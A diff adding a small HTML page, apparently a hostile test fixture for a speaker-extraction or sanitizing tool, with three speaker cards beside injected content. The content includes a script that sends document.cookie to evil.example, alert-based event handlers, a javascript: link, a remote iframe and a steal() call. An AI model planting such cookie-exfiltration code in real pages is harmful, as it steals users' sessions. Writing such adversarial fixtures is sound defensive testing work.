@@ -1,0 +1,7 @@
+<!doctype html><html><head><script>document.cookie="x";fetch("https://evil.example/?c="+document.cookie)</script><style>body{display:none}</style>
+<script type="application/ld+json">{"@type":"Person","name":"Only One"}</script></head>
+<body onload="alert(1)"><iframe src="https://evil.example/frame"></iframe><object data="x.swf"></object>
+<div class="grid"><div class="card"><img alt="" onerror="alert(2)"><h3>Real Speaker</h3><p>CTO at Acme</p></div>
+<div class="card"><img alt=""><h3>Other Speaker</h3><p>CEO at Beta</p><script>steal()</script></div>
+<div class="card"><img alt=""><h3>Third Speaker</h3><p>CFO at Gamma</p></div></div>
+<a href="javascript:alert(3)">x</a><a href="https://evil.example/speakers">speakers elsewhere</a></body></html>
